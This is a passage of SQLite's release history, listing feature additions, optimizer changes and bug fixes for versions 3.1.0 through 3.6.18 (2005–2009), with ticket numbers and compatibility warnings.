read-only database. 2009-09-11 (3.6.18) Versioning of the SQLite source code has transitioned from CVS to Fossil. Query planner enhancements. The SQLITE_ENABLE_STAT2 compile-time option causes the ANALYZE command to collect a small histogram of each index, to help SQLite better select among competing range query indices. Recursive triggers can be enabled using the PRAGMA recursive_triggers statement. Delete triggers fire when rows are removed due to a REPLACE conflict resolution. This feature is only enabled when recursive triggers are enabled. Added the SQLITE_OPEN_SHAREDCACHE and SQLITE_OPEN_PRIVATECACHE flags for sqlite3_open_v2() used to override the global shared cache mode settings for individual database connections. Added improved version identification features: C-Preprocessor macro SQLITE_SOURCE_ID, C/C++ interface sqlite3_sourceid(), and SQL function sqlite_source_id(). Obscure bug fix on triggers ([efc02f9779]). 2009-08-10 (3.6.17) Expose the sqlite3_strnicmp() interface for use by extensions and applications. Remove the restriction on virtual tables and shared cache mode. Virtual tables and shared cache can now be used at the same time. Many code simplifications and obscure bug fixes in support of providing 100% branch test coverage. 2009-06-27 (3.6.16) Fix a bug (ticket #3929) that occasionally causes INSERT or UPDATE operations to fail on an indexed table that has a self-modifying trigger. Other minor bug fixes and performance optimizations. 2009-06-15 (3.6.15) Refactor the internal representation of SQL expressions so that they use less memory on embedded platforms. Reduce the amount of stack space used Fix an 64-bit alignment bug on HP/UX and Sparc The sqlite3_create_function() family of interfaces now return SQLITE_MISUSE instead of SQLITE_ERROR when passed invalid parameter combinations. When new tables are created using CREATE TABLE ... AS SELECT ... the datatype of the columns is the simplified SQLite datatype (TEXT, INT, REAL, NUMERIC, or BLOB) instead of a copy of the original datatype from the source table. Resolve race conditions when checking for a hot rollback journal. The sqlite3_shutdown() interface frees all mutexes under windows. Enhanced robustness against corrupt database files Continuing improvements to the test suite and fixes to obscure bugs and inconsistencies that the test suite improvements are uncovering. 2009-05-25 (3.6.14.2) Fix a code generator bug introduced in version 3.6.14. This bug can cause incorrect query results under obscure circumstances. Ticket #3879. 2009-05-19 (3.6.14.1) Fix a bug in group_concat(), ticket #3841 Fix a performance bug in the pager cache, ticket #3844 Fix a bug in the sqlite3_backup implementation that can lead to a corrupt backup database. Ticket #3858. 2009-05-07 (3.6.14) Added the optional asynchronous VFS module. Enhanced the query optimizer so that virtual tables are able to make use of OR and IN operators in the WHERE clause. Speed improvements in the btree and pager layers. Added the SQLITE_HAVE_ISNAN compile-time option which will cause the isnan() function from the standard math library to be used instead of SQLite's own home-brew NaN checker. Countless minor bug fixes, documentation improvements, new and improved test cases, and code simplifications and cleanups. 2009-04-13 (3.6.13) Fix a bug in version 3.6.12 that causes a segfault when running a count(*) on the sqlite_master table of an empty database. Ticket #3774. Fix a bug in version 3.6.12 that causes a segfault that when inserting into a table using a DEFAULT value where there is a function as part of the DEFAULT value expression. Ticket #3791. Fix data structure alignment issues on Sparc. Ticket #3777. Other minor bug fixes. 2009-03-31 (3.6.12) Fixed a bug that caused database corruption when an incremental_vacuum is rolled back in an in-memory database. Ticket #3761. Added the sqlite3_unlock_notify() interface. Added the reverse_unordered_selects pragma. The default page size on windows is automatically adjusted to match the capabilities of the underlying filesystem. Add the new \".genfkey\" command in the CLI for generating triggers to implement foreign key constraints. Performance improvements for \"count(*)\" queries. Reduce the amount of heap memory used, especially by TRIGGERs. 2009-02-18 (3.6.11) Added the hot-backup interface. Added new commands \".backup\" and \".restore\" to the CLI. Added new methods backup and restore to the TCL interface. Improvements to the syntax bubble diagrams Various minor bug fixes 2009-01-15 (3.6.10) Fix a cache coherency problem that could lead to database corruption. Ticket #3584. 2009-01-14 (3.6.9) Fix two bugs, which when combined might result in incorrect query results. Both bugs were harmless by themselves; only when they team up do they cause problems. Ticket #3581. 2009-01-12 (3.6.8) Added support for nested transactions Enhanced the query optimizer so that it is able to use multiple indices to efficiently process OR-connected constraints in a WHERE clause. Added support for parentheses in FTS3 query patterns using the SQLITE_ENABLE_FTS3_PARENTHESIS compile-time option. 2008-12-16 (3.6.7) Reorganize the Unix interface in os_unix.c Added support for \"Proxy Locking\" on Mac OS X. Changed the prototype of the sqlite3_auto_extension() interface in a way that is backwards compatible but which might cause warnings in new builds of applications that use that interface. Changed the signature of the xDlSym method of the sqlite3_vfs object in a way that is backwards compatible but which might cause compiler warnings. Added superfluous casts and variable initializations in order to suppress nuisance compiler warnings. Fixes for various minor bugs. 2008-11-26 (3.6.6.2) Fix a bug in the b-tree delete algorithm that seems like it might be able to cause database corruption. The bug was first introduced in version 3.6.6 by check-in [5899] on 2008-11-13. Fix a memory leak that can occur following a disk I/O error. 2008-11-22 (3.6.6.1) Fix a bug in the page cache that can lead database corruption following a rollback. This bug was first introduced in version 3.6.4. Two other very minor bug fixes 2008-11-19 (3.6.6) Fix a #define that prevented memsys5 from compiling Fix a problem in the virtual table commit mechanism that was causing a crash in FTS3. Ticket #3497. Add the application-defined page cache Added built-in support for VxWorks 2008-11-12 (3.6.5) Add the MEMORY option to the journal_mode pragma. Added the sqlite3_db_mutex() interface. Added the SQLITE_OMIT_TRUNCATE_OPTIMIZATION compile-time option. Fixed the truncate optimization so that sqlite3_changes() and sqlite3_total_changes() interfaces and the count_changes pragma return the correct values. Added the sqlite3_extended_errcode() interface. The COMMIT command now succeeds even if there are pending queries. It returns SQLITE_BUSY if there are pending incremental BLOB I/O requests. The error code is changed to SQLITE_BUSY (instead of SQLITE_ERROR) when an attempt is made to ROLLBACK while one or more queries are still pending. Drop all support for the experimental memory allocators memsys4 and memsys6. Added the SQLITE_ZERO_MALLOC compile-time option. 2008-10-15 (3.6.4) Add option support for LIMIT and ORDER BY clauses on DELETE and UPDATE statements. Only works if SQLite is compiled with SQLITE_ENABLE_UPDATE_DELETE_LIMIT. Added the sqlite3_stmt_status() interface for performance monitoring. Add the INDEXED BY clause. The LOCKING_STYLE extension is now enabled by default on Mac OS X Added the TRUNCATE option to PRAGMA journal_mode Performance enhancements to tree balancing logic in the B-Tree layer. Added the source code and documentation for the genfkey program for automatically generating triggers to enforce foreign key constraints. Added the SQLITE_OMIT_TRUNCATE_OPTIMIZATION compile-time option. The SQL language documentation is converted to use syntax diagrams instead of BNF. Other minor bug fixes 2008-09-22 (3.6.3) Fix for a bug in the SELECT DISTINCT logic that was introduced by the prior version. Other minor bug fixes 2008-08-30 (3.6.2) Split the pager subsystem into separate pager and pcache subsystems. Factor out identifier resolution procedures into separate files. Bug fixes 2008-08-06 (3.6.1) Added the lookaside memory allocator for a speed improvement in excess of 15% on some workloads. (Your mileage may vary.) Added the SQLITE_CONFIG_LOOKASIDE verb to sqlite3_config() to control the default lookaside configuration. Added verbs SQLITE_STATUS_PAGECACHE_SIZE and SQLITE_STATUS_SCRATCH_SIZE to the sqlite3_status() interface. Modified SQLITE_CONFIG_PAGECACHE and SQLITE_CONFIG_SCRATCH to remove the \"+4\" magic number in the buffer size computation. Added the sqlite3_db_config() and sqlite3_db_status() interfaces for controlling and monitoring the lookaside allocator separately on each database connection. Numerous other performance enhancements Miscellaneous minor bug fixes 2008-07-16 (3.6.0 beta) Modifications to the virtual file system interface to support a wider range of embedded systems. See 35to36.html for additional information. *** Potentially incompatible change *** All C-preprocessor macros used to control compile-time options now begin with the prefix \"SQLITE_\". This may require changes to applications that compile SQLite using their own makefiles and with custom compile-time options, hence we mark this as a *** Potentially incompatible change *** The SQLITE_MUTEX_APPDEF compile-time option is no longer supported. Alternative mutex implementations can now be added at run-time using the sqlite3_config() interface with the SQLITE_CONFIG_MUTEX verb. *** Potentially incompatible change *** The handling of IN and NOT IN operators that contain a NULL on their right-hand side expression is brought into compliance with the SQL standard and with other SQL database engines. This is a bug fix, but as it has the potential to break legacy applications that depend on the older buggy behavior, we mark that as a *** Potentially incompatible change *** The result column names generated for compound subqueries have been simplified to show only the name of the column of the original table and omit the table name. This makes SQLite operate more like other SQL database engines. Added the sqlite3_config() interface for doing run-time configuration of the entire SQLite library. Added the sqlite3_status() interface used for querying run-time status information about the overall SQLite library and its subsystems. Added the sqlite3_initialize() and sqlite3_shutdown() interfaces. The SQLITE_OPEN_NOMUTEX option was added to sqlite3_open_v2(). Added the PRAGMA page_count command. Added the sqlite3_next_stmt() interface. Added a new R*Tree virtual table 2008-05-14 (3.5.9) Added experimental support for the journal_mode PRAGMA and persistent journal. Journal mode PERSIST is the default behavior in exclusive locking mode. Fix a performance regression on LEFT JOIN (see ticket #3015) that was mistakenly introduced in version 3.5.8. Performance enhancement: Reengineer the internal routines used to interpret and render variable-length integers. Fix a buffer-overrun problem in sqlite3_mprintf() which occurs when a string without a zero-terminator is passed to \"%.*s\". Always convert IEEE floating point NaN values into NULL during processing. (Ticket #3060) Make sure that when a connection blocks on a RESERVED lock that it is able to continue after the lock is released. (Ticket #3093) The \"configure\" scripts should now automatically configure Unix systems for large file support. Improved error messages for when large files are encountered and large file support is disabled. Avoid cache pages leaks following disk-full or I/O errors And, many more minor bug fixes and performance enhancements.... 2008-04-16 (3.5.8) Expose SQLite's internal pseudo-random number generator (PRNG) via the sqlite3_randomness() interface New interface sqlite3_context_db_handle() that returns the database connection handle that has invoked an application-defined SQL function. New interface sqlite3_limit() allows size and length limits to be set on a per-connection basis and at run-time. Improved crash-robustness: write the database page size into the rollback journal header. Allow the VACUUM command to change the page size of a database file. The xAccess() method of the VFS is allowed to return -1 to signal a memory allocation error. Performance improvement: The OP_IdxDelete opcode uses unpacked records, obviating the need for one OP_MakeRecord opcode call for each index record deleted. Performance improvement: Constant subexpressions are factored out of loops. Performance improvement: Results of OP_Column are reused rather than issuing multiple OP_Column opcodes. Fix a bug in the RTRIM collating sequence. Fix a bug in the SQLITE_SECURE_DELETE option that was causing Firefox crashes. Make arrangements to always test SQLITE_SECURE_DELETE prior to each release. Other miscellaneous performance enhancements. Other miscellaneous minor bug fixes. 2008-03-17 (3.5.7) Fix a bug (ticket #2927) in the register allocation for compound selects - introduced by the new VM code in version 3.5.5. ALTER TABLE uses double-quotes instead of single-quotes for quoting filenames. Use the WHERE clause to reduce the size of a materialized VIEW in an UPDATE or DELETE statement. (Optimization) Do not apply the flattening optimization if the outer query is an aggregate and the inner query contains ORDER BY. (Ticket #2943) Additional OS/2 updates Added an experimental power-of-two, first-fit memory allocator. Remove all instances of sprintf() from the code Accept \"Z\" as the zulu timezone at the end of date strings Fix a bug in the LIKE optimizer that occurs when the last character before the first wildcard is an upper-case \"Z\" Added the \"bitvec\" object for keeping track of which pages have been journalled. Improves speed and reduces memory consumption, especially for large database files. Get the SQLITE_ENABLE_LOCKING_STYLE macro working again on Mac OS X. Store the statement journal in the temporary file directory instead of collocated with the database file. Many improvements and cleanups to the configure script 2008-02-06 (3.5.6) Fix a bug (ticket #2913) that prevented virtual tables from working in a LEFT JOIN. The problem was introduced into shortly before the 3.5.5 release. Bring the OS/2 porting layer up-to-date. Add the new sqlite3_result_error_code() API and use it in the implementation of ATTACH so that proper error codes are returned when an ATTACH fails. 2008-01-31 (3.5.5) Convert the underlying virtual machine to be a register-based machine rather than a stack-based machine. The only user-visible change is in the output of EXPLAIN. Add the build-in RTRIM collating sequence. 2007-12-14 (3.5.4) Fix a critical bug in UPDATE or DELETE that occurs when an OR REPLACE clause or a trigger causes rows in the same table to be deleted as side effects. (See ticket #2832.) The most likely result of this bug is a segmentation fault, though database corruption is a possibility. Bring the processing of ORDER BY into compliance with the SQL standard for case where a result alias and a table column name are in conflict. Correct behavior is to prefer the result alias. Older versions of SQLite incorrectly picked the table column. (See ticket #2822.) The VACUUM command preserves the setting of the legacy_file_format pragma. (Ticket #2804.) Productize and officially support the group_concat() SQL function. Better optimization of some IN operator expressions. Add the ability to change the auto_vacuum status of a database by setting the auto_vaccum pragma and VACUUMing the database. Prefix search in FTS3 is much more efficient. Relax the SQL statement length restriction in the CLI so that the \".dump\" output of databases with very large BLOBs and strings can be played back to recreate the database. Other small bug fixes and optimizations. 2007-11-27 (3.5.3) Move website and documentation files out of the source tree into a separate CM system. Fix a long-standing bug in INSERT INTO ... SELECT ... statements where the SELECT is compound. Fix a long-standing bug in RAISE(IGNORE) as used in BEFORE triggers. Fixed the operator precedence for the ~ operator. On Win32, do not return an error when attempting to delete a file that does not exist. Allow collating sequence names to be quoted. Modify the TCL interface to use sqlite3_prepare_v2(). Fix multiple bugs that can occur following a malloc() failure. sqlite3_step() returns SQLITE_MISUSE instead of crashing when called with a NULL parameter. FTS3 now uses the SQLite memory allocator exclusively. The FTS3 amalgamation can now be appended to the SQLite amalgamation to generate a super-amalgamation containing both. The DISTINCT keyword now will sometimes use an INDEX if an appropriate index is available and the optimizer thinks its use might be advantageous. 2007-11-05 (3.5.2) Dropped support for the SQLITE_OMIT_MEMORY_ALLOCATION compile-time option. Always open files using FILE_FLAG_RANDOM_ACCESS under Windows. The 3rd parameter of the built-in SUBSTR() function is now optional. Bug fix: do not invoke the authorizer when reparsing the schema after a schema change. Added the experimental malloc-free memory allocator in mem3.c. Virtual machine stores 64-bit integer and floating point constants in binary instead of text for a performance boost. Fix a race condition in test_async.c. Added the \".timer\" command to the CLI 2007-10-04 (3.5.1) Nota Bene: We are not using terms \"alpha\" or \"beta\" on this release because the code is stable and because if we use those terms, nobody will upgrade. However, we still reserve the right to make incompatible changes to the new VFS interface in future releases. Fix a bug in the handling of SQLITE_FULL errors that could lead to database corruption. Ticket #2686. The test_async.c drive now does full file locking and works correctly when used simultaneously by multiple processes on the same database. The CLI ignores whitespace (including comments) at the end of lines Make sure the query optimizer checks dependencies on all terms of a compound SELECT statement. Ticket #2640. Add demonstration code showing how to build a VFS for a raw mass storage without a filesystem. Added an output buffer size parameter to the xGetTempname() method of the VFS layer. Sticky SQLITE_FULL or SQLITE_IOERR errors in the pager are reset when a new transaction is started. 2007-09-04 (3.5.0) alpha Redesign the OS interface layer. See 34to35.html for details. *** Potentially incompatible change *** The sqlite3_release_memory(), sqlite3_soft_heap_limit(), and sqlite3_enable_shared_cache() interfaces now work cross all threads in the process, not just the single thread in which they are invoked. *** Potentially incompatible change *** Added the sqlite3_open_v2() interface. Reimplemented the memory allocation subsystem and made it replaceable at compile-time. Created a new mutex subsystem and made it replicable at compile-time. The same database connection may now be used simultaneously by separate threads. 2007-08-13 (3.4.2) Fix a database corruption bug that might occur if a ROLLBACK command is executed in auto-vacuum mode and a very small sqlite3_soft_heap_limit is set. Ticket #2565. Add the ability to run a full regression test with a small sqlite3_soft_heap_limit. Fix other minor problems with using small soft heap limits. Work-around for GCC bug 32575. Improved error detection of misused aggregate functions. Improvements to the amalgamation generator script so that all symbols are prefixed with either SQLITE_PRIVATE or SQLITE_API. 2007-07-20 (3.4.1) Fix a bug in VACUUM that can lead to database corruptio if two processes are connected to the database at the same time and one VACUUMs then the other then modifies the database. The expression \"+column\" is now considered the same as \"column\" when computing the collating sequence to use on the expression. In the TCL language interface, \"@variable\" instead of \"$variable\" always binds as a blob. Added PRAGMA freelist_count for determining the current size of the freelist. The PRAGMA auto_vacuum=incremental setting is now persistent. Add FD_CLOEXEC to all open files under Unix. Fix a bug in the min()/max() optimization when applied to descending indices. Make sure the TCL language interface works correctly with 64-bit integers on 64-bit machines. Allow the value -9223372036854775808 as an integer literal in SQL statements. Add the capability of \"hidden\" columns in virtual tables. Use the macro SQLITE_PRIVATE (defaulting to \"static\") on all internal functions in the amalgamation. Add pluggable tokenizers and ICU tokenization support to FTS2 Other minor bug fixes and documentation enhancements 2007-06-18 (3.4.0) Fix a bug that can lead to database corruption if an SQLITE_BUSY error occurs in the middle of an explicit transaction and that transaction is later committed. Ticket #2409. Fix a bug that can lead to database corruption if autovacuum mode is on and a malloc() failure follows a CREATE TABLE or CREATE INDEX statement which itself follows a cache overflow inside a transaction. See ticket #2418. Added explicit upper bounds on the sizes and quantities of things SQLite can process. This change might cause compatibility problems for applications that use SQLite in the extreme, which is why the current release is 3.4.0 instead of 3.3.18. Added support for Incremental BLOB I/O. Added the sqlite3_bind_zeroblob() API and the zeroblob() SQL function. Added support for Incremental Vacuum. Added the SQLITE_MIXED_ENDIAN_64BIT_FLOAT compile-time option to support ARM7 processors with goofy endianness. Removed all instances of sprintf() and strcpy() from the core library. Added support for International Components for Unicode (ICU) to the full-text search extensions. In the Windows OS driver, reacquire a SHARED lock if an attempt to acquire an EXCLUSIVE lock fails. Ticket #2354 Fix the REPLACE() function so that it returns NULL if the second argument is an empty string. Ticket #2324. Document the hazards of type conversions in sqlite3_column_blob() and related APIs. Fix unnecessary type conversions. Ticket #2321. Internationalization of the TRIM() function. Ticket #2323 Use memmove() instead of memcpy() when moving between memory regions that might overlap. Ticket #2334 Fix an optimizer bug involving subqueries in a compound SELECT that has both an ORDER BY and a LIMIT clause. Ticket #2339. Make sure the sqlite3_snprintf() interface does not zero-terminate the buffer if the buffer size is less than 1. Ticket #2341 Fix the built-in printf logic so that it prints \"NaN\" not \"Inf\" for floating-point NaNs. Ticket #2345 When converting BLOB to TEXT, use the text encoding of the main database. Ticket #2349 Keep the full precision of integers (if possible) when casting to NUMERIC. Ticket #2364 Fix a bug in the handling of UTF16 codepoint 0xE000 Consider explicit collate clauses when matching WHERE constraints to indices in the query optimizer. Ticket #2391 Fix the query optimizer to correctly handle constant expressions in the ON clause of a LEFT JOIN. Ticket #2403 Fix the query optimizer to handle rowid comparisons to NULL correctly. Ticket #2404 Fix many potential segfaults that could be caused by malicious SQL statements. 2007-04-25 (3.3.17) When the \"write_version\" value of the database header is larger than what the library understands, make the database read-only instead of unreadable. Other minor bug fixes 2007-04-18 (3.3.16) Fix a bug that caused VACUUM to fail if NULLs appeared in a UNIQUE column. Reinstate performance improvements that were added in Version 3.3.14 but regressed in Version 3.3.15. Fix problems with the handling of ORDER BY expressions on compound SELECT statements in subqueries. Fix a potential segfault when destroying locks on WinCE in a multi-threaded environment. Documentation updates. 2007-04-09 (3.3.15) Fix a bug introduced in 3.3.14 that caused a rollback of CREATE TEMP TABLE to leave the database connection wedged. Fix a bug that caused an extra NULL row to be returned when a descending query was interrupted by a change to the database. The FOR EACH STATEMENT clause on a trigger now causes a syntax error. It used to be silently ignored. Fix an obscure and relatively harmless problem that might have caused a resource leak following an I/O error. Many improvements to the test suite. Test coverage now exceeded 98% 2007-04-02 (3.3.14) Fix a bug (ticket #2273) that could cause a segfault when the IN operator is used one one term of a two-column index and the right-hand side of the IN operator contains a NULL. Added a new OS interface method for determining the sector size of underlying media: sqlite3OsSectorSize(). A new algorithm for statements of the form INSERT INTO table1 SELECT * FROM table2 is faster and reduces fragmentation. VACUUM uses statements of this form and thus runs faster and defragments better. Performance enhancements through reductions in disk I/O: Do not read the last page of an overflow chain when deleting the row - just add that page to the freelist. Do not store pages being deleted in the rollback journal. Do not read in the (meaningless) content of pages extracted from the freelist. Do not flush the page cache (and thus avoiding a cache refill) unless another process changes the underlying database file. Truncate rather than delete the rollback journal when committing a transaction in exclusive access mode, or when committing the TEMP database. Added support for exclusive access mode using \"PRAGMA locking_mode=EXCLUSIVE\" Use heap space instead of stack space for large buffers in the pager - useful on embedded platforms with stack-space limitations. Add a makefile target \"sqlite3.c\" that builds an amalgamation containing the core SQLite library C code in a single file. Get the library working correctly when compiled with GCC option \"-fstrict-aliasing\". Removed the vestigal SQLITE_PROTOCOL error. Improvements to test coverage, other minor bugs fixed, memory leaks plugged, code refactored and/or recommended in places for easier reading. 2007-02-13 (3.3.13) Add a \"fragmentation\" measurement in the output of sqlite3_analyzer. Add the COLLATE operator used to explicitly set the collating sequence used by an expression. This feature is considered experimental pending additional testing. Allow up to 64 tables in a join - the old limit was 32. Added two new experimental functions: randomBlob() and hex(). Their intended use is to facilitate generating UUIDs. Fix a problem where PRAGMA count_changes was causing incorrect results for updates on tables with triggers Fix a bug in the ORDER BY clause optimizer for joins where the left-most table in the join is constrained by a UNIQUE index. Fixed a bug in the \"copy\" method of the TCL interface. Bug fixes in fts1 and fts2 modules. 2007-01-27 (3.3.12) Fix another bug in the IS NULL optimization that was added in version 3.3.9. Fix an assertion fault that occurred on deeply nested views. Limit the amount of output that PRAGMA integrity_check generates. Minor syntactic changes to support a wider variety of compilers. 2007-01-22 (3.3.11) Fix another bug in the implementation of the new sqlite3_prepare_v2() API. We'll get it right eventually... Fix a bug in the IS NULL optimization that was added in version 3.3.9 - the bug was causing incorrect results on certain LEFT JOINs that included in the WHERE clause an IS NULL constraint for the right table of the LEFT JOIN. Make AreFileApisANSI() a no-op macro in WinCE since WinCE does not support this function. 2007-01-09 (3.3.10) Fix bugs in the implementation of the new sqlite3_prepare_v2() API that can lead to segfaults. Fix 1-second round-off errors in the strftime() function Enhance the Windows OS layer to provide detailed error codes Work around a win2k problem so that SQLite can use single-character database file names The user_version and schema_version pragmas correctly set their column names in the result set Documentation updates 2007-01-04 (3.3.9) Fix bugs in pager.c that could lead to database corruption if two processes both try to recover a hot journal at the same instant Added the sqlite3_prepare_v2() API. Fixed the \".dump\" command in the command-line shell to show indices, triggers and views again. Change the table_info pragma so that it returns NULL for the default value if there is no default value Support for non-ASCII characters in win95 filenames Query optimizer enhancements: Optimizer does a better job of using indices to satisfy ORDER BY clauses that sort on the integer primary key Use an index to satisfy an IS NULL operator in the WHERE clause Fix a bug that was causing the optimizer to miss an OR optimization opportunity The optimizer has more freedom to reorder tables in the FROM clause even in there are LEFT joins. Extension loading supported added to WinCE Allow constraint names on the DEFAULT clause in a table definition Added the \".bail\" command to the command-line shell Make CSV (comma separate value) output from the command-line shell more closely aligned to accepted practice Experimental FTS2 module added Use sqlite3_mprintf() instead of strdup() to avoid libc dependencies VACUUM uses a temporary file in the official TEMP folder, not in the same directory as the original database The prefix on temporary filenames on Windows is changed from \"sqlite\" to \"etilqs\". 2006-10-09 (3.3.8) Support for full text search using the FTS1 module (beta) Added Mac OS X locking patches (beta - disabled by default) Introduce extended error codes and add error codes for various kinds of I/O errors. Added support for IF EXISTS on CREATE/DROP TRIGGER/VIEW Fix the regression test suite so that it works with Tcl8.5 Enhance sqlite3_set_authorizer() to provide notification of calls to SQL functions. Added experimental API: sqlite3_auto_extension() Various minor bug fixes 2006-08-12 (3.3.7) Added support for virtual tables (beta) Added support for dynamically loaded extensions (beta) The sqlite3_interrupt() routine can be called for a different thread Added the MATCH operator. The default file format is now 1. 2006-06-06 (3.3.6) Plays better with virus scanners on Windows Faster :memory: databases Fix an obscure segfault in UTF-8 to UTF-16 conversions Added driver for OS/2 Correct column meta-information returned for aggregate queries Enhanced output from EXPLAIN QUERY PLAN LIMIT 0 now works on subqueries Bug fixes and performance enhancements in the query optimizer Correctly handle NULL filenames in ATTACH and DETACH Improved syntax error messages in the parser Fix type coercion rules for the IN operator 2006-04-05 (3.3.5) CHECK constraints use conflict resolution algorithms correctly. The SUM() function throws an error on integer overflow. Choose the column names in a compound query from the left-most SELECT instead of the right-most. The sqlite3_create_collation() function honors the SQLITE_UTF16_ALIGNED flag. SQLITE_SECURE_DELETE compile-time option causes deletes to overwrite old data with zeros. Detect integer overflow in abs(). The random() function provides 64 bits of randomness instead of only 32 bits. Parser detects and reports automaton stack overflow. Change the round() function to return REAL instead of TEXT. Allow WHERE clause terms on the left table of a LEFT OUTER JOIN to contain aggregate subqueries. Skip over leading spaces in text to numeric conversions. Various minor bug and documentation typo fixes and performance enhancements. 2006-02-11 (3.3.4) Fix a blunder in the Unix mutex implementation that can lead to deadlock on multithreaded systems. Fix an alignment problem on 64-bit machines Added the fullfsync pragma. Fix an optimizer bug that could have caused some unusual LEFT OUTER JOINs to give incorrect results. The SUM function detects integer overflow and converts to accumulating an approximate result using floating point numbers Host parameter names can begin with '@' for compatibility with SQL Server. Other miscellaneous bug fixes 2006-01-31 (3.3.3) Removed support for an ON CONFLICT clause on CREATE INDEX - it never worked correctly so this should not present any backward compatibility problems. Authorizer callback now notified of ALTER TABLE ADD COLUMN commands After any changes to the TEMP database schema, all prepared statements are invalidated and must be recreated using a new call to sqlite3_prepare() Other minor bug fixes in preparation for the first stable release of version 3.3 2006-01-24 (3.3.2 beta) Bug fixes and speed improvements. Improved test coverage. Changes to the OS-layer interface: mutexes must now be recursive. Discontinue the use of thread-specific data for out-of-memory exception handling 2006-01-16 (3.3.1 alpha) Countless bug fixes Speed improvements Database connections can now be used by multiple threads, not just the thread in which they were created. 2006-01-11 (3.3.0 alpha) CHECK constraints IF EXISTS and IF NOT EXISTS clauses on CREATE/DROP TABLE/INDEX. DESC indices More efficient encoding of boolean values resulting in smaller database files More aggressive SQLITE_OMIT_FLOATING_POINT Separate INTEGER and REAL affinity Added a virtual function layer for the OS interface \"exists\" method added to the TCL interface Improved response to out-of-memory errors Database cache can be optionally shared between connections in the same thread Optional READ UNCOMMITTED isolation (instead of the default isolation level of SERIALIZABLE) and table level locking when database connections share a common cache. 2005-12-19 (3.2.8) Fix an obscure bug that can cause database corruption under the following unusual circumstances: A large INSERT or UPDATE statement which is part of an even larger transaction fails due to a uniqueness constraint but the containing transaction commits. 2005-12-19 (2.8.17) Fix an obscure bug that can cause database corruption under the following unusual circumstances: A large INSERT or UPDATE statement which is part of an even larger transaction fails due to a uniqueness contraint but the containing transaction commits. 2005-09-24 (3.2.7) GROUP BY now considers NULLs to be equal again, as it should Now compiles on Solaris and OpenBSD and other Unix variants that lack the fdatasync() function Now compiles on MSVC++6 again Fix uninitialized variables causing malfunctions for various obscure queries Correctly compute a LEFT OUTER JOINs that is constrained on the left table only 2005-09-17 (3.2.6) Fix a bug that can cause database corruption if a VACUUM (or autovacuum) fails and is rolled back on a database that is larger than 1GiB LIKE optimization now works for columns with COLLATE NOCASE ORDER BY and GROUP BY now use bounded memory Added support for COUNT(DISTINCT expr) Change the way SUM() handles NULL values in order to comply with the SQL standard Use fdatasync() instead of fsync() where possible in order to speed up commits slightly Use of the CROSS keyword in a join turns off the table reordering optimization Added the experimental and undocumented EXPLAIN QUERY PLAN capability Use the unicode API in Windows 2005-08-27 (3.2.5) Fix a bug effecting DELETE and UPDATE statements that changed more than 40960 rows. Change the makefile so that it no longer requires GNUmake extensions Fix the --enable-threadsafe option on the configure script Fix a code generator bug that occurs when the left-hand side of an IN operator is constant and the right-hand side is a SELECT statement The PRAGMA synchronous=off statement now disables syncing of the master journal file in addition to the normal rollback journals 2005-08-24 (3.2.4) Fix a bug introduced in the previous release that can cause a segfault while generating code for complex WHERE clauses. Allow floating point literals to begin or end with a decimal point. 2005-08-21 (3.2.3) Added support for the CAST operator Tcl interface allows BLOB values to be transferred to user-defined functions Added the \"transaction\" method to the Tcl interface Allow the DEFAULT value of a column to call functions that have constant operands Added the ANALYZE command for gathering statistics on indices and using those statistics when picking an index in the optimizer Remove the limit (formerly 100) on the number of terms in the WHERE clause The right-hand side of the IN operator can now be a list of expressions instead of just a list of constants Rework the optimizer so that it is able to make better use of indices The order of tables in a join is adjusted automatically to make better use of indices The IN operator is now a candidate for optimization even if the left-hand side is not the left-most term of the index. Multiple IN operators can be used with the same index. WHERE clause expressions using BETWEEN and OR are now candidates for optimization Added the \"case_sensitive_like\" pragma and the SQLITE_CASE_SENSITIVE_LIKE compile-time option to set its default value to \"on\". Use indices to help with GLOB expressions and LIKE expressions too when the case_sensitive_like pragma is enabled Added support for grave-accent quoting for compatibility with MySQL Improved test coverage Dozens of minor bug fixes 2005-06-12 (3.2.2) Added the sqlite3_db_handle() API Added the sqlite3_get_autocommit() API Added a REGEXP operator to the parser. There is no function to back up this operator in the standard build but users can add their own using sqlite3_create_function() Speed improvements and library footprint reductions. Fix byte alignment problems on 64-bit architectures. Many, many minor bug fixes and documentation updates. 2005-03-29 (3.2.1) Fix a memory allocation error in the new ADD COLUMN comment. Documentation updates 2005-03-21 (3.2.0) Added support for ALTER TABLE ADD COLUMN. Added support for the \"T\" separator in ISO-8601 date/time strings. Improved support for Cygwin. Numerous bug fixes and documentation updates. 2005-03-17 (3.1.6) Fix a bug that could cause database corruption when inserting record into tables with around 125 columns. sqlite3_step() is now much more likely to invoke the busy handler and less likely to return SQLITE_BUSY. Fix memory leaks that used to occur after a malloc() failure. 2005-03-11 (3.1.5) The ioctl on Mac OS X to control syncing to disk is F_FULLFSYNC, not F_FULLSYNC. The previous release had it wrong. 2005-03-11 (3.1.4) Fix a bug in autovacuum that could cause database corruption if a CREATE UNIQUE INDEX fails because of a constraint violation. This problem only occurs if the new autovacuum feature introduced in version 3.1 is turned on. The F_FULLSYNC ioctl (currently only supported on Mac OS X) is disabled if the synchronous pragma is set to something other than \"full\". Add additional forward compatibility to the future version 3.2 database file format. Fix a bug in WHERE clauses of the form (rowid<'2') New SQLITE_OMIT_... compile-time options added Updates to the man page Remove the use of strcasecmp() from the shell Windows DLL exports symbols Tclsqlite_Init and Sqlite_Init 2005-02-19 (3.1.3) Fix a problem with VACUUM on databases from which tables containing AUTOINCREMENT have been dropped. Add forward compatibility to the future version 3.2 database file format. Documentation updates 2005-02-15 (3.1.2) Fix a bug that can lead to database corruption if there are two open connections to the same database and one connection does a VACUUM and the second makes some change to the database. Allow \"?\" parameters in the LIMIT clause. Fix VACUUM so that it works with AUTOINCREMENT. Fix a race condition in AUTOVACUUM that can lead to corrupt databases Add a numeric version number to the sqlite3.h include file. Other minor bug fixes and performance enhancements. 2005-02-15 (2.8.16) Fix a bug that can lead to database corruption if there are two open connections to the same database and one connection does a VACUUM and the second makes some change to the database. Correctly handle quoted names in CREATE INDEX statements. Fix a naming conflict between sqlite.h and sqlite3.h. Avoid excess heap usage when copying expressions. Other minor bug fixes. 2005-02-01 (3.1.1 BETA) Automatic caching of prepared statements in the TCL interface ATTACH and DETACH as well as some other operations cause existing prepared statements to expire. Numerous minor bug fixes 2005-01-21 (3.1.0 ALPHA) Autovacuum support added CURRENT_TIME, CURRENT_DATE, and CURRENT_TIMESTAMP added Support for the EXISTS clause added. Support for correlated subqueries added. Added the ESCAPE clause on the LIKE operator. Support for ALTER TABLE ... RENAME TABLE ... added AUTOINCREMENT keyword supported on INTEGER 